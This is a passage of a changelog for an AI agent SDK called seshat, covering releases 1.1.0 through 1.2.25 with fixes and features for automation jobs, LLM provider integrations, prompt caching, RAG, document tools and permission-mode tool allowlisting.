- `internal/automation.Job` gains an optional `Graph *dataflow.Definition`, an alternative to the existing flat `Task` — every existing job (the primary consumer being the Scheduling-page style use case) keeps working unchanged, since `Task` is simply ignored when `Graph` is set. `RunnerConfig` gains `NodeRegistry`/`Secrets`; a job with a `Graph` fails clearly rather than silently no-oping when `NodeRegistry` isn't configured, since which node types are available (registering the database package pulls in Postgres/MySQL/MongoDB/Redis/Elasticsearch client code) is a deployment choice, not something this package defaults on its own. `jobWorkflow`'s new `agent`/`subworkflow` node adapters reuse the job's own session across every node call, unlike `sdk.Client.RunWorkflow`'s default executor (`pkg/sdk/workflow.go`), which starts a fresh session per node.

Design and several pieces (the level-based execution/cycle-detection approach, the HTTP node's SSRF blocklist) adapted from [neul-labs/m9m](https://github.com/neul-labs/m9m) (MIT license, see `pkg/dataflow/NOTICE`) — studied as a reference after deciding not to import it as a dependency (two young projects coupling was judged too risky for something this central). Redis/MongoDB/SQLite deliberately diverge from m9m's own choices where those don't fit a self-hosted deployment (m9m's Redis/MongoDB nodes only work through an HTTP REST proxy — Upstash-style for Redis, MongoDB Atlas Data API for Mongo, neither available for a plain self-hosted instance) or force a cgo dependency onto every consumer.

## [1.2.25] — 2026-08-31

### Fixed
- `pkg/automation/automation.go`: `TriggerTypeEvent` (added in 1.2.24) was never added to this package's public re-export const block, unlike the other three trigger types - an external consumer (e.g. seshat-ai) could reference `Trigger.IsEvent()`/`RunEvent` fine (methods pass through the `Trigger`/`JobScheduler` type aliases automatically), but had no way to actually construct a `Trigger{Type: automation.TriggerTypeEvent}` at all. Found immediately while wiring the first real consumer (seshat-ai's Inbox workflow feature) - `go vet` caught it as an undefined identifier on the very first build.

## [1.2.24] — 2026-08-31

### Added
- `internal/automation/job.go`: `TriggerTypeEvent` — a job trigger that fires on demand (`JobScheduler.RunEvent`) instead of on a schedule, for embedding applications that want to react to their own events (e.g. seshat-ai's Inbox reacting to a newly-arrived message) rather than polling. `Trigger` gains `EventType`/`EventFilter` (opaque strings this package stores/passes through — matching an event against `EventType` and evaluating `EventFilter` against its payload is entirely the caller's responsibility, keeping this package free of any event-specific dependency); `Trigger.IsEvent()` reports the new type. `AddJob`/`UpdateJob`/`ResumeJob`/`rehydrate` skip schedule computation for it, and it's naturally invisible to the time-based ticker (`tick`) since it never has a `NextRunAt`. New `JobScheduler.RunEvent(ctx, job, contextText)` mirrors `RunNow` but takes an already-loaded `Job` plus event context text to append to its task, for a caller that already has the job in hand from its own event-matching pass. First real consumer: seshat-ai's Inbox workflow-automation feature (Inbox Agent-authored "when a message arrives matching X, do Y" rules), the reason this session studied `neul-labs/m9m` in the first place.

## [1.2.23] — 2026-08-31

### Fixed
- `internal/automation/scheduler.go`: `CronSchedule.Next` required BOTH day-of-month and day-of-week to match whenever neither was `*` (AND logic) — e.g. `0 9 15 * 1` ("9am on the 15th, and every Monday") only fired when the 15th happened to land on a Monday. Standard POSIX cron semantics require EITHER to match in that case (OR logic), only requiring both when one of the two fields is `*`. The hand-rolled bitmask parser is replaced with `robfig/cron/v3` (MIT), which implements this correctly; `CronSchedule` is now a thin adapter over it so `Trigger.ToSchedule`/`JobScheduler` are unaffected. Idea to use a battle-tested cron library instead of a hand-rolled parser came from studying `neul-labs/m9m` (MIT), which does the same.
- `internal/engine/loop.go`: `waitRecoveryBackoff` (the retry delay for every recoverable provider error — rate limits, timeouts, transient API/network errors, across the whole SDK) grew linearly (`multiplier*attempt`: 250ms, 500ms, 750ms...) with no jitter, so many sessions/jobs hitting the same upstream outage would all retry in lockstep against an already-struggling provider. Now exponential (doubling each attempt, capped by a new `LoopConfig.RecoveryBackoffMaxDelay`, default 30s) plus up to 25% jitter — standard practice for exactly this "thundering herd" failure mode. `RecoveryBackoffMultiplier`'s existing meaning (base delay in ms, default 250) and `MaxRecoveryAttempts` are unaffected. Idea from studying `neul-labs/m9m` (MIT), which does the same for its own retry policy; seshat's own error *classification* (`recoveryLabel`/`ClassifyHTTPError`, structured/typed) was already more robust than m9m's substring-matching approach, so only the delay formula changed.

### Added
- `internal/automation/job.go`: `Job.MaxDuration` (per-execution wall-clock timeout, via `context.WithTimeout`) and `Job.MaxRuns` (total execution count cap, tracked via a new `Job.RunCount`) — a scheduled job with a hung agent turn previously ran forever, and there was no way to cap how many times a recurring job should fire. Idea and shape from studying `neul-labs/m9m` (MIT), which has the same two concepts on its schedule config; reimplemented natively here (small enough that no code was actually copied). `internal/db`: new SQLite migration (`20260831_017_automation_job_limits`) adds the backing columns.

## [1.2.22] — 2026-08-30

### Fixed
- `internal/tools/agents/agent_tool.go`: the `agent` tool's own `run_in_background: true` mode never notified callers of real completion — only `TaskGet`/`TaskList` polling could ever learn the outcome, and the engine's generic tool-execution pipeline emits its own "completed" `tool.progress` event for the dispatch itself (creating the background task, not finishing it) almost instantly. Since this tool is literally named `agent` — the same name the synchronous, blocking call path uses, whose "completed" event genuinely IS the real completion — clients had no way to tell a real completion apart from a mere dispatch acknowledgement for this specific mode. Fixed the same way `spawn_agent` (`spawn_agent.go`) already handles this: a background goroutine now blocks on `Manager.WaitForTask` and emits a second `tool.progress` event carrying `metadata.subagent_finished=true` once the task actually reaches a terminal state — the same marker `spawn_agent`'s own notifier already uses, so a consuming client can apply one shared rule for both. The dispatch's own immediate response text no longer claims "there is no completion notification for this."

### Added
- `pkg/sdk/shell_hooks.go`: `Client.ReloadPreToolHooks(cfgs []PreToolHookConfig) error` replaces a client's entire shell pre-tool hook set live. Previously `ClientConfig.PreToolHooks` was only ever read once, inside `NewClient` — a consumer resolving hook configuration from a remote source (an org-shared catalog, for example) had no way to pick up a change without restarting the whole process, unlike MCP servers (`ReloadMCPServers`). Removes any existing registration by its fixed `ToolHook.ID` before re-registering, so repeated calls replace the set atomically instead of accumulating duplicate, double-firing registrations.
- `internal/runtime/hooks/registry.go`: `Registry.Remove(id string) int` drops every hook with the given ID and reports how many were removed — the missing counterpart to the existing `Add`, needed for `ReloadPreToolHooks` above.
- `internal/execution/orchestrator.go`: `Orchestrator.RemoveHook(id string) int` exposes `Registry.Remove` at the orchestrator level, mirroring `AddHook`.
- `pkg/sdk/client_sessions.go`: `Client.RemoveToolHook(id string)` exposes the above at the public `Client` level, mirroring `AddToolHook`.

## [1.2.20] — 2026-08-28

A broad provider-reliability pass following up on the `previous_response_id`
work in 1.2.19, plus two critical fixes found by live-testing Codex against
a real ChatGPT-account session (documented in
`docs/audits/providers-incident-2026-08.md`).

### Fixed
- `internal/providers/client_codex.go`, `internal/engine/loop.go`: Codex was completely broken for real ChatGPT-account sessions since `previous_response_id` continuation shipped in 1.2.19 — confirmed via a live smoke test against a real account, `chatgpt.com/backend-api/codex` rejects `"store": true` outright (`{"detail":"Store must be set to false"}`), and `previous_response_id` can only reference a response the API actually stored, so the whole continuation hint could never be validly redeemed. `store` is back to `false`; `recordPreviousResponse` is now a permanent no-op for Codex rather than populating a hint that would only fail a later call. The surrounding plumbing (`APIRequest`/`MutableState` fields, `buildAPIRequest`'s read side) is left in place but inert, in case a store-compatible path for this backend is found later.
- `internal/providers/client.go`: model aliases (`ModelAliasMapping`, e.g. Codex's `"default"` → `"gpt-5.6-sol"`) were never actually applied to the outgoing request — confirmed via the same live smoke test, the real API received the literal string `"default"` and rejected it (`{"detail":"The 'default' model is not supported..."}`). `Config.ResolveModel` was only ever called inside `GetEndpoint`, which only matters for providers whose endpoint URL embeds the model (Gemini); every OpenAI-compatible provider and Codex put the model in the JSON body via `ModelIdentifier.ProviderModelName()`, which has no access to alias mapping. New `Client.resolveRequestModel` is now called at the top of every public entry point (`CreateMessage`, `CreateMessageStreamResultWithCallback`, `CreateMessageStream`) so every adapter — body and endpoint alike — sees the resolved model consistently. This means every alias for every provider, not just Codex's, was silently non-functional against the real API until now.
- `internal/providers/config.go`: `config.go`'s Codex `ModelAliasMapping` (`default`/`codex` → `gpt-5.3-codex`, `5.2` → `gpt-5.2-codex`) pointed at model IDs `registry.go`'s own catalog comment already documented as confirmed broken against a real ChatGPT-account session. Repointed at the confirmed-working catalog (`gpt-5.6-sol`, `gpt-5.4-mini`, plus a new `5.5` alias); the `5.2`/`5.3` shorthand aliases are removed rather than silently repointed. Live-tested all 6 known Codex model IDs afterward (including 3 the catalog comment had marked unconfirmed) — all work.
- `internal/engine/loop.go`: `isRecoverableError` treated every `*types.EngineError` with `Code: ErrCodeAPIResponse` as permanent, no matter what caused it — but all 5 provider stream parsers (Anthropic/Bedrock/Vertex/Foundry/WorkersAI, OpenAI-compatible, Gemini, Ollama, Codex) wrap *every* body-read/decode I/O error with that same generic code, including a genuinely transient mid-stream socket death. A dropped connection during streaming was therefore never retried, only ever treated as a terminal failure. `isRecoverableError` now falls through to the structured network classifier (`providerretry.ClassifyHTTPError`) on the wrapped cause when the code is `ErrCodeAPIResponse` and a cause is present, instead of trusting the generic code alone.
- `internal/providers/config.go`, `internal/providers/fetch.go`: MiniMax was non-functional end to end. Its `GetEndpoint` double-appended `/chat/completions` onto a `BaseURL` that was already a full endpoint path, guaranteeing a 404; fixing that surfaced a deeper problem verified directly against `platform.minimax.io`'s own docs — `api.minimax.chat` isn't a real MiniMax domain at all, and the endpoint path it pointed at (`/v1/text/chatcompletion_v2`) is documented deprecated. `BaseURL` is now `https://api.minimax.io/v1` (a real API root, like every other OpenAI-compatible provider here), routed through the standard `/chat/completions` path. This also fixes model-sync discovery (`fetch.go`'s `DefaultBaseURL`), since the corrected domain genuinely serves `/v1/models`.
- `internal/providers/registry.go`: MiniMax's registry description said "Anthropic-compatible"; it actually routes through `openAICompatAdapter` and sends OpenAI-shaped bodies. Cosmetic only, but misleading.
- `internal/providers/adapter.go`, `internal/providers/config.go`, `pkg/config/provider_catalog.go`: WorkersAI was completely non-functional — absent from `adapterForProvider`'s real dispatch cases (silently fell through to the Anthropic Messages wire format, wrong request shape, wrong `x-api-key` auth), and its default `BaseURL` (`https://workers.ai/v1/chat`) wasn't a real Cloudflare domain. Verified directly against Cloudflare's docs: Workers AI exposes a genuine OpenAI-compatible endpoint (`.../accounts/{account_id}/ai/v1/chat/completions`, Bearer auth), so it now routes through the same `openAICompatAdapter` shared by 7 other providers. The Cloudflare account id reuses the same `ProjectID`/`provider_project_id` slot Vertex uses for its GCP project id (an account/tenant identifier embedded in the request URL); the CLI setup wizard surfaces it with no changes needed in `cmd/cli`, since that wiring was already provider-generic. Model-sync discovery is still unavailable for WorkersAI — Cloudflare's OpenAI-compatible surface has no `/v1/models` at all.
- `internal/providers/registry.go`, `internal/providers/config.go`: DeepSeek's registered models (`deepseek-chat`, `deepseek-reasoner`, `deepseek-coder-v2`) are legacy V3.1-era IDs; DeepSeek's own pricing docs (checked directly, not a secondary source) list only the current V4 lineup (`deepseek-v4-flash`, `deepseek-v4-pro`, `deepseek-v4-flash-vision-exp`), consistent with reports the old IDs were retired 2026-07-24. This wasn't just a wrong context-window number as originally suspected — the whole catalog was likely targeting model IDs that no longer resolve. Registry and alias mapping repointed at the current models.
- `internal/providers/client.go`: Foundry's structured `SystemPromptBlocks` (carrying `cache_control`) were only preserved for `provider == APIProviderAnthropic`; every other provider sharing this request builder — including Foundry, which speaks the identical Anthropic Messages format and already gets tool-definition caching — fell back to a flattening path that drops `CacheControl` entirely, silently degrading Foundry's system-prompt cache to uncached.
- `internal/types/message.go`, `internal/providers/client.go`: Anthropic prompt caching only ever covered the stable half of the system prompt and the last tool definition — `TextContent` and `ToolResultContent` had no `CacheControl` field at all, so the growing conversation/tool-result history in a long agentic loop was resent uncached on every single call. Both types now carry `CacheControl`, and a new `anthropicMessagesWithCacheControl` marks the last cacheable block of the last message before serialization, mirroring the existing tool-caching pattern.
- `internal/providers/client.go`: `ResponseHeaderTimeout` (60s) was shared by every provider, with no override for Ollama — a local request can legitimately block behind loading a large model into memory longer than that. Ollama now gets a 5-minute timeout instead of the shared 60s default.
- `internal/providers/registry.go`: three registry corrections, each verified against official docs before changing anything — Kimi's `SupportsPC` was `false` despite Moonshot's fully automatic server-side caching (no client action required, so the flag was wrong regardless of what this codebase's own request building does); OpenRouter's provider-level `SupportsPC: true` was never backed by any of its 3 listed models, and this codebase routes it through the OpenAI-compatible adapter with no `cache_control` field at all, so it's now `false` to match what's actually implemented; Mistral Small's context window (`32768`) matched the superseded Mistral Small 3, corrected to `131072` (128K) for the current Mistral Small 3.1.

### Changed
- `docling_convert`'s tool description now explicitly tells the agent to convert a whole PPTX/document in a single call rather than improvising a per-slide/per-image workaround (terminal commands, ad-hoc scripts, individually OCR'ing extracted slide images) — observed in a real session, this produced many small tool calls instead of the one call docling-serve is designed to handle in a single pass, with worse layout/reading-order/table-structure results than letting docling process the whole document at once.
- `internal/engine/session.go`: async session-title generation (`generateTitleAsync`, wired through `Engine.SetOnSessionTitled`) now fires as soon as a new session's first message is persisted, instead of after that first turn finishes. It only ever reads the first user message text — never the assistant's response — so gating it on turn completion had no functional reason and just meant a session sat as "Untitled" through the entirety of its first (often the longest) reply before a client polling for the title would ever see one. `firstUserMessageText`, only used by the old post-turn call site, is removed; the trigger now passes the already-in-hand submitted text directly.
- `internal/officetext`: `Extract`'s `.pptx` path only reported whether *any* text was found (`ok`), not whether it was plausible for the deck's size — a slide deck that's mostly screenshots/diagrams with only a title or two of real text would "succeed" and short-circuit before ever reaching docling-serve for OCR, silently dropping almost all of the deck's actual content. `Extract` now also returns `sparse` (true when extracted text is below `MinCharsPerSlide` per slide, mirroring `pdftext.Result.Sparse`'s existing per-page heuristic for scanned PDFs), and `read_file`'s docling fallback path treats a sparse PPTX the same as an empty one: automatic escalation to docling, no agent judgment call required. `Extract`'s signature changed (`(markdown, ok, err)` → `(markdown, ok, sparse, err)`) — a breaking change for the handful of internal and external (seshat-ai) callers, all updated in this release.

### Removed
- `internal/providers/config.go`: `Config.BuildAuthHeaders()` had zero references anywhere, including tests — a stale, unmaintained duplicate of the auth logic that actually runs (`adapter.go`'s `applyAuthHeaders`).

## [1.2.3] — 2026-08-01

### Fixed
- `internal/permissions/engine.go`: `get_file_metadata` (a read-only `stat()` call, `RequiresPermission: false` in its own definition) was missing from `isAlwaysSafeTool`, so in Auto permission mode every call went through the two-stage LLM classifier instead of being heuristically allowed — extra API calls per check, and, observed live, an incorrect "blocking for safety" deny when the classifier's own response failed to parse, compounding with provider rate limits.
- Same file: audited every registered tool for the same gap and added 19 more with an identical, individually-verified safety profile (`IsReadOnly: true`, `RequiresPermission: false`, `IsDestructive: false`, and a trivial passthrough `CheckPermissions` with no conditional logic) — `notebook_read`; the read/search/fetch tools in `devto`, `hackernews`, `reddit`, `twitter` (their write/publish siblings are correctly left requiring classification); `get_config`, `get_goal`, `rag_search`, `repo_map`, `workflow_draft`; `seshat_list_skills`, `seshat_read_skill`, `seshat_validate_skill`; `list_agents`, `wait_agent`.

### Notes
- Deliberately not touched in this pass, pending a follow-up decision: the browser read tools (`browser_snapshot`/`browser_screenshot`/etc. — mechanically read-only, but a live browser session can be authenticated into real accounts, a different risk profile than a filesystem read) and `job_output`/`task_get`/`task_list`/`task_output`/`monitor` (heterogeneous `CheckPermissions` implementations — `task_get` has real conditional deny logic that `isAlwaysSafeTool`'s short-circuit would bypass entirely, unlike the trivial-passthrough tools added above).

## [1.2.2] — 2026-08-01

### Fixed
- `internal/agent/goal`: the durable goal store wrote through to its SQLite backend on every plain `Get()` (not just on mutation), and held its mutex during backend I/O in `Update`/`RecordTokenUsage` — under an active goal the runner reads goal state up to three times per agent turn, so this added needless write amplification and let one session's backend latency stall unrelated sessions through the shared lock. Reads are now lock-scoped snapshots that never write, and mutation methods release the lock before calling the backend. Returned `Goal` values are now always defensive clones, so callers can no longer mutate store-internal state without going through the mutex.
- `internal/seshattui/ui/dialog/doctor.go`, `internal/seshattui/ui/model/ui.go`: opening or refreshing the TUI's Doctor dialog ran `DoctorReport()` (SQLite ping, `git`/`uv` subprocess checks) synchronously inside Bubble Tea's event loop, freezing the whole UI for as long as those checks took. Both paths now dispatch through a `tea.Cmd`.
- `cmd/cli/background.go`: `seshat run --bg --name X` had a TOCTOU race — the name-availability check only scanned already-saved session files, but a new session isn't saved until after its process starts, so two concurrent launches with the same name could both pass the check and leave two live sessions sharing one name. Name reservation is now atomic (`O_EXCL`) and happens before the process starts.
- `pkg/companion`: `companion.Save` wrote profile data with a plain truncate-and-write, so a crash mid-write could corrupt `companion.json` and turn the next load into a hard error instead of falling back to defaults. It now writes to a temp file and renames it into place, matching the pattern already used for background session metadata.

### Notes
- The `v1.2.0` GitHub release was cut prematurely from a feature branch before it merged to `main` and has been marked as a superseded pre-release; `v1.2.1` was the first correct build of the feature set below.

## [1.2.1] — 2026-08-01

### Added
- Goals created through `create_goal` are now persisted in the SQLite session database when `SessionSQLitePath` is configured, and successful session turns record token usage against the active goal so `get_goal`/`update_goal` can survive client/session restart.
- TUI chat now replaces hidden `task_create`/`task_update` plan tool calls with a compact "Plan" task checklist block, keeping plan progress visible without exposing internal task tools.
- `seshat doctor` command backed by reusable `pkg/doctor` diagnostics for local config, runtime paths, SQLite session storage, provider credentials, and helper tools.
- TUI settings hub now exposes the same doctor diagnostics in a scrollable "Doctor" dialog with refresh support.
- `pkg/repomap`, `seshat repomap`, and the read-only `repo_map` tool provide Go-first repository structure summaries, with optional system-context injection via `SESHAT_REPO_MAP=1`.
- Local background session commands: `seshat run --bg [--name NAME] "PROMPT"` starts a detached child process, while `seshat ps`, `seshat logs <id-or-name> [-f]`, `seshat attach <id-or-name>`, and `seshat kill <id-or-name>` manage tracked background runs.
- `pkg/workflow`, `Client.RunWorkflow`, and `seshat workflow run <file>` provide a minimal static YAML/JSON DAG runner: nodes declare `needs`, independent nodes run in parallel, and dependency outputs are injected into downstream prompts.
- `workflow_draft` and `sdk.DraftWorkflow` let agents and headless hosts validate and render reusable static workflow DAG definitions before saving or running them.
- Workflow nodes now support `kind: agent|verifier|critic|router`; role-specific prompt scaffolding helps agents build review, critique, and routing stages while keeping the runner's execution model static.
- `pkg/companion`, `ClientConfig.Companion`, and `seshat companion` add a headless-first companion profile that can inject a lightweight collaboration presence into sessions without replacing the core Seshat system prompt.
- Kimi/Moonshot is now consistently available from CLI and TUI provider setup, using the international `https://api.moonshot.ai/v1` endpoint and OpenAI-compatible Bearer auth.

## [1.1.0] — 2026-08-01

### Added
- `excel_edit` tool: create/edit `.xlsx` cells and formulas natively (excelize), with a read-before-write gate matching `write_file`/`edit_file`.
- `docx_edit` tool: create Word documents from plain/markdown-ish text (`#`.."######" → real Word heading styles) or find/replace edit existing ones, with fuzzy-match diagnostics on a near-miss.
- `write_pdf` tool: create/append/delete-pages PDFs via `go-pdf/fpdf` + `pdfcpu` — no headless-browser dependency.
- `search_start` tool: cancellable, streaming background content search (reuses `job_output`/`job_kill`) that also searches inside `.docx`/`.pptx`/`.xlsx` content, which ripgrep can't see.
- `get_config` tool (read-only): exposes the effective security policy — denied command fragments/patterns, commands requiring approval, read/write-denied path prefixes, file-read limits, sandbox availability, default shell.
- `internal/tools/files/documentreader` package: `read_document_url` (moved from `files/read_url`) plus new `convert_document` for explicit local-file conversion (OCR, complex slide decks, audio transcription) — FileRead's own automatic document-reader fallback is unchanged.
- `rag_delete` tool: delete an entire corpus or a single file's chunks — previously unreachable capability (`Service.DeleteNamespace`/`DeleteFileChunks` existed but no tool exposed them).
- `rag_ingest` gains an optional `file_id` param (defaults to `filename`) for idempotent re-ingest — re-ingesting the same file now replaces its chunks instead of accumulating duplicates.
- **Vectorless RAG**: `rag_ingest`/`rag_search` now work without any embedding provider configured, via pure BM25/keyword ranking (real BM25 through SQLite FTS5; keyword-overlap scoring on HNSW/Memory). Previously RAG was hard-disabled with no embedder at all.
- RAG now falls back to the SQLite vector backend when the embedded HNSW backend is unavailable — notably on Windows, where `github.com/coder/hnsw`'s atomic-write dependency doesn't build, which previously disabled RAG entirely regardless of configuration.
- Reranking now actually runs: `SetReranker` was implemented but never wired up; RAG search now reranks results when a reranker is configured.
- Reranker generalized beyond LangSearch's hosted API into `HTTPReranker`, additionally speaking HuggingFace TEI's shape — point `RAG_RERANK_URL` at a self-hosted TEI/vLLM instance (e.g. `BAAI/bge-reranker-v2-m3`) for a free alternative requiring no API key.
- `SemanticChunker` (embedding-similarity sentence grouping) is now actually used by the CLI's RAG wiring when an embedder is configured, instead of always falling back to the naive `ParagraphChunker`.
- No-API-key DuckDuckGo fallback provider for `web_search`.
- `pkg/rag/embedder`: `FromEnv()`/`NewFromEnv()` (parity with `pkg/rag/reranker`).
- `pkg/web/search/providers`: `NewDuckDuckGoProvider()` and `ProviderModeDuckDuckGo` (parity with the other providers in the same file).
- `pkg/rag`: `ParagraphChunker`, `SemanticChunker`, `DefaultChunker()`, `NewSemanticChunker()`, `ArtifactKey()` — `NewService` requires a `Chunker` argument, but no implementation was previously reachable from the public API.
- `pkg/image` + `pkg/image/providers` (OpenAI DALL-E, Google Imagen) and `pkg/audio/stt` + `pkg/audio/tts` + `pkg/audio/providers` (OpenAI Whisper/TTS): standalone client libraries, mirroring `pkg/docling` — a host application can now call image/speech generation directly (e.g. a UI where a human types a prompt) without going through the agent's LLM tool-calling loop for a deterministic action. The same provider implementations power both the direct call and the `generate_image`/`text_to_speech`/`speech_to_text` agent tools. `WithSTTBaseURL`/`WithOpenAIBaseURL`/`WithTTSBaseURL` all support pointing at a self-hosted, OpenAI-API-compatible server (e.g. a local whisper.cpp instance) with no API key.
- `pkg/fim` + `pkg/fim/providers` (Mistral Codestral, DeepSeek): same standalone-client treatment for Fill-in-the-Middle code completion, previously reachable only through the `code_complete` agent tool. FIM is explicitly suited to IDE integrations/in-editor ghost text, where a tool-calling LLM turn per keystroke makes no sense.
- Session auto-title generation feature: AI auto-titles sessions after the first successful turn using the user message.
- `OnSessionTitled` callback and `DisableTitleGeneration` configuration options in `ClientConfig`.
- `CredentialResolver` interface in `pkg/sdk` — allows per-request API key injection without touching `ClientConfig.APIKey`
- `generate_image` tool backed by `image.Generation` interface (OpenAI DALL-E 3 and Google Gemini Imagen providers)
- `text_to_speech` and `speech_to_text` tools backed by pluggable audio providers (OpenAI TTS-1, Whisper)
- OpenTelemetry tracing (`internal/monitoring/tracer.go`) — OTLP gRPC export, no-op when `OTEL_EXPORTER_OTLP_ENDPOINT` is unset
- `pkg/monitoring` public package exposing `InitTracer` and `Tracer`
- `.github/workflows/ci.yml` — build, test (race), lint on push/PR
- `.github/workflows/release.yml` — cross-platform binary release on `v*` tags
- `.githooks/pre-commit` — gofmt + go vet + golangci-lint (install with `make hooks`)
- `SetDefault` and `GetDefaultByUserID` on `ProviderSettingStore`
- Community files: `SECURITY.md`, `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, `AGENTS.md`
- Architecture diagrams in `docs/vision/diagrams.md` (Mermaid)
- Project vision and 3-level roadmap in `docs/vision/`

### Changed
- Makefile: replaced `build-api` (removed) with `build-grpc`; added `fmt`, `vet`, `hooks` targets
- `docs/architecture.md`: removed `cmd/api` from entry points (it lives in nexus-product)
- `docs/transports.md`: translated to English, removed HTTP API section (nexus-product), fixed absolute paths

### Fixed
- `internal/tools/files/patch/patch.go`: replaced `if HasSuffix` with `strings.TrimSuffix` (golangci-lint S1017)
- `internal/providers/auth.go`: removed OAuth credential values from log output (security: S1)
- `pkg/rag/embedder`: `EmbedTexts` now splits large requests into batches (default 64 texts), since some hosted embedding APIs (e.g. Mistral) reject an oversized request outright instead of truncating it
- `readDoclingFile` (FileRead's docling path) now records read-state on all three success paths, fixing a false "file has not been read yet" block on binary formats read via docling.
- A re-ingested RAG file that shrank (fewer chunks than its previous version) no longer leaves the old version's stale trailing chunks behind — `Service.Ingest` now cleans them up via the existing (but previously unused) `DeleteFileChunks`.
- `ParagraphChunker.Split` now slices by rune instead of byte index — a byte-index cut could land inside a multi-byte UTF-8 character (e.g. accented French text) and corrupt it at the chunk boundary.
- Fixed a "typed nil" bug found while wiring up vectorless RAG: passing a nil `*embedder.Embedder` into an `Embedder` interface parameter produced a non-nil interface wrapping a nil pointer, so `embedder != nil` checks were incorrectly true and the first call panicked on a nil receiver.

### Removed
- `cmd/api` — moved to `nexus-product` (the open-source engine does not own the HTTP product layer)
- `docs/backend-boundary.md` and `docs/internal-boundary-audit.md` — monorepo-era documents, no longer relevant
- `docs/archive/` — speculative archived docs removed
- `internal/tools/special/docx` (docxgo-based): registered until 2026-06-03, deregistered but left orphaned since 2026-06-18. Its `content` param was inserted verbatim with zero markdown parsing — the new `docx_edit` converts `#`.."######" to real Word heading styles instead. Also drops the now-unused `mmonterroca/docxgo/v2` dependency.
- `internal/tools/special/brief`: a "send message to the user" tool from the pre-rename codebase, never registered at any point in its history.
- `internal/tools/special/config/configTool.go`: an arbitrary key/value settings store predating the current `contract.Tool` interface (incompatible signatures — could never have been registered as-is), replaced by the real `get_config` tool.

[Unreleased]: https://github.com/KPO-Tech/seshat/compare/v1.2.55...HEAD
[1.2.55]: https://github.com/KPO-Tech/seshat/compare/v1.2.54...v1.2.55
[1.2.54]: https://github.com/KPO-Tech/seshat/compare/v1.2.53...v1.2.54
[1.2.53]: https://github.com/KPO-Tech/seshat/compare/v1.2.52...v1.2.53
[1.2.52]: https://github.com/KPO-Tech/seshat/compare/v1.2.51...v1.2.52
[1.1.0]: https://github.com/KPO-Tech/seshat/compare/v1.0.4...v1.1.0
